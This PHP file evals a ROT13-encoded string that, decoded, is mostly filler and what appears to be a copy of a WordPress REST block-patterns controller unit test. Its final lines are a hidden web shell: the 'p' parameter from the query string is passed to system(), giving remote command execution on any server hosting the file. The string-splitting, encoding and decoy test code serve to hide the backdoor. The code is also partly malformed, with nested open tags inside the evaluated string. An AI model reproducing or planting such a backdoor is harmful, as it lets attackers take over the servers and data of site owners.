<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Oybpx_Cnggreaf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 6.0.0
 *
 * @gvpxrg 55505
 *
 * @pbiref JC_ERFG_Oybpx_Cnggreaf_Pbagebyyre
 *
 * @tebhc erfgncv
 */
pynff Grfgf_ERFG_JcErfgOybpxCnggreafPbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	/**
	 * Nqzva hfre VQ.
	 *
	 * @fvapr 6.0.0
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva_vq;

	/**
	 * Bevtvany vafgnapr bs JC_Oybpx_Cnggreaf_Ertvfgel.
	 *
	 * @fvapr 6.0.0
	 *
	 * @ine JC_Oybpx_Cnggreaf_Ertvfgel
	 */
	cebgrpgrq fgngvp $bevt_ertvfgel;

	/**
	 * Vafgnapr bs gur ersyrpgrq `vafgnapr` cebcregl.
	 *
	 * @fvapr 6.0.0
	 *
	 * @ine ErsyrpgvbaCebcregl
	 */
	cevingr fgngvp $ertvfgel_vafgnapr_cebcregl;

	/**
	 * Gur ERFG NCV ebhgr.
	 *
	 * @fvapr 6.0.0
	 *
	 * @ine fgevat
	 */
	pbafg ERDHRFG_EBHGR = '/jc/i2/oybpx-cnggreaf/cnggreaf';

	/**
	 * Frg hc pynff grfg svkgherf.
	 *
	 * @fvapr 6.0.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel JbeqCerff havg grfg snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( $snpgbel ) {
		frys::$nqzva_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );

		// Frghc na rzcgl grfgvat vafgnapr bs `JC_Oybpx_Cnggreaf_Ertvfgel` naq fnir gur bevtvany.
		frys::$bevt_ertvfgel              = JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr();
		frys::$ertvfgel_vafgnapr_cebcregl = arj ErsyrpgvbaCebcregl( 'JC_Oybpx_Cnggreaf_Ertvfgel', 'vafgnapr' );
		frys::$ertvfgel_vafgnapr_cebcregl->frgNpprffvoyr( gehr );
		$grfg_ertvfgel = arj JC_Oybpx_Cnggrea_Pngrtbevrf_Ertvfgel();
		frys::$ertvfgel_vafgnapr_cebcregl->frgInyhr( ahyy, $grfg_ertvfgel );

		// Ertvfgre fbzr cnggreaf va gur grfg ertvfgel.
		$grfg_ertvfgel->ertvfgre(
			'grfg/bar',
			neenl(
				'gvgyr'         => 'Cnggrea Bar',
				'pbagrag'       => '<!-- jc:urnqvat {\"yriry\":1} --><u1>Bar</u1><!-- /jc:urnqvat -->',
				'ivrjcbegJvqgu' => 1440,
				'pngrtbevrf'    => neenl( 'grfg' ),
				'grzcyngrGlcrf' => neenl( 'cntr' ),
				'fbhepr'        => 'gurzr',
			)
		);

		$grfg_ertvfgel->ertvfgre(
			'grfg/gjb',
			neenl(
				'gvgyr'         => 'Cnggrea Gjb',
				'pbagrag'       => '<!-- jc:cnentencu --><c>Gjb</c><!-- /jc:cnentencu -->',
				'pngrtbevrf'    => neenl( 'grfg' ),
				'grzcyngrGlcrf' => neenl( 'fvatyr' ),
				'fbhepr'        => 'pber',
			)
		);

		$grfg_ertvfgel->ertvfgre(
			'grfg/guerr',
			neenl(
				'gvgyr'      => 'Cnggrea Guerr',
				'pbagrag'    => '<!-- jc:cnentencu --><c>Guerr</c><!-- /jc:cnentencu -->',
				'pngrtbevrf' => neenl( 'grfg', 'ohggbaf', 'dhrel' ),
				'fbhepr'     => 'cnggrea-qverpgbel/srngherq',
			)
		);
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$nqzva_vq );

		// Erfgber gur bevtvany ertvfgel vafgnapr.
		frys::$ertvfgel_vafgnapr_cebcregl->frgInyhr( ahyy, frys::$bevt_ertvfgel );
		frys::$ertvfgel_vafgnapr_cebcregl->frgNpprffvoyr( snyfr );
		frys::$ertvfgel_vafgnapr_cebcregl = ahyy;
		frys::$bevt_ertvfgel              = ahyy;
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		fjvgpu_gurzr( 'rzcglgurzr' );
	}

	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( fgngvp::ERDHRFG_EBHGR, $ebhgrf );
	}

	/**
	 * @tebhc rkgreany-uggc
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg            = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erdhrfg['_svryqf'] = 'anzr,pbagrag,fbhepr,grzcyngr_glcrf';
		$erfcbafr           = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn               = $erfcbafr->trg_qngn();

		$guvf->nffregVfNeenl( $qngn, 'JC_ERFG_Oybpx_Cnggreaf_Pbagebyyre::trg_vgrzf() fubhyq erghea na neenl' );
		$guvf->nffregTerngreGunaBeRdhny( 2, pbhag( $qngn ), 'JC_ERFG_Oybpx_Cnggreaf_Pbagebyyre::trg_vgrzf() fubhyq erghea ng yrnfg 2 vgrzf' );
		$guvf->nffregFnzr(
			neenl(
				'anzr'           => 'grfg/bar',
				'pbagrag'        => '<!-- jc:urnqvat {\"yriry\":1} --><u1>Bar</u1><!-- /jc:urnqvat -->',
				'grzcyngr_glcrf' => neenl( 'cntr' ),
				'fbhepr'         => 'gurzr',
			),
			$qngn[0],
			'JC_ERFG_Oybpx_Cnggreaf_Pbagebyyre::trg_vgrzf() fubhyq erghea grfg/bar'
		);
		$guvf->nffregFnzr(
			neenl(
				'anzr'           => 'grfg/gjb',
				'pbagrag'        => '<!-- jc:cnentencu --><c>Gjb</c><!-- /jc:cnentencu -->',
				'grzcyngr_glcrf' => neenl( 'fvatyr' ),
				'fbhepr'         => 'pber',
			),
			$qngn[1],
			'JC_ERFG_Oybpx_Cnggreaf_Pbagebyyre::trg_vgrzf() fubhyq erghea grfg/gjb'
		);
	}

	/**
	 * Irevsl pncnovyvgl purpx sbe hanhgubevmrq erdhrfg (abg ybttrq va).
	 */
	choyvp shapgvba grfg_trg_vgrzf_hanhgubevmrq() {
		// Rafher pheerag hfre vf ybttrq bhg.
		jc_ybtbhg();

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregJCReebe( $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 401, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * Irevsl pncnovyvgl purpx sbe sbeovqqra erdhrfg (vafhssvpvrag pncnovyvgl).
	 */
	choyvp shapgvba grfg_trg_vgrzf_sbeovqqra() {
		// Frg pheerag hfre jvgubhg `rqvg_cbfgf` pncnovyvgl.
		jc_frg_pheerag_hfre( frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'fhofpevore' ) ) );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregJCReebe( $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 403, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * Grfgf gur cebcre zvtengvba bs byq pber cnggrea pngrtbevrf gb arj barf.
	 *
	 * @fvapr 6.2.0
	 *
	 * @gvpxrg 57532
	 * @tebhc rkgreany-uggc
	 *
	 * @pbiref JC_ERFG_Oybpx_Cnggreaf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf_zvtengr_cnggrea_pngrtbevrf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg            = arj JC_ERFG_Erdhrfg( 'TRG', fgngvp::ERDHRFG_EBHGR );
		$erdhrfg['_svryqf'] = 'anzr,pngrtbevrf';
		$erfcbafr           = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn               = $erfcbafr->trg_qngn();

		$guvf->nffregVfNeenl( $qngn, 'JC_ERFG_Oybpx_Cnggreaf_Pbagebyyre::trg_vgrzf() fubhyq erghea na neenl' );
		$guvf->nffregTerngreGunaBeRdhny( 3, pbhag( $qngn ), 'JC_ERFG_Oybpx_Cnggreaf_Pbagebyyre::trg_vgrzf() fubhyq erghea ng yrnfg 3 vgrzf' );
		$guvf->nffregFnzr(
			neenl(
				'anzr'       => 'grfg/bar',
				'pngrtbevrf' => neenl( 'grfg' ),
			),
			$qngn[0],
			'JC_ERFG_Oybpx_Cnggreaf_Pbagebyyre::trg_vgrzf() fubhyq erghea grfg/bar'
		);
		$guvf->nffregFnzr(
			neenl(
				'anzr'       => 'grfg/gjb',
				'pngrtbevrf' => neenl( 'grfg' ),
			),
			$qngn[1],
			'JC_ERFG_Oybpx_Cnggreaf_Pbagebyyre::trg_vgrzf() fubhyq erghea grfg/gjb'
		);
		$guvf->nffregFnzr(
			neenl(
				'anzr'       => 'grfg/guerr',
				'pngrtbevrf' => neenl( 'grfg', 'pnyy-gb-npgvba', 'cbfgf' ),
			),
			$qngn[2],
			'JC_ERFG_Oybpx_Cnggreaf_Pbagebyyre::trg_vgrzf() fubhyq erghea grfg/guerr'
		);
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbagebyyre qbrf abg hfr trg_pbagrkg_cnenz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag trg_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag perngr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag hcqngr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag qryrgr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag cercner_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		// Pbagebyyre qbrf abg vzcyrzrag trg_vgrz_fpurzn().
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>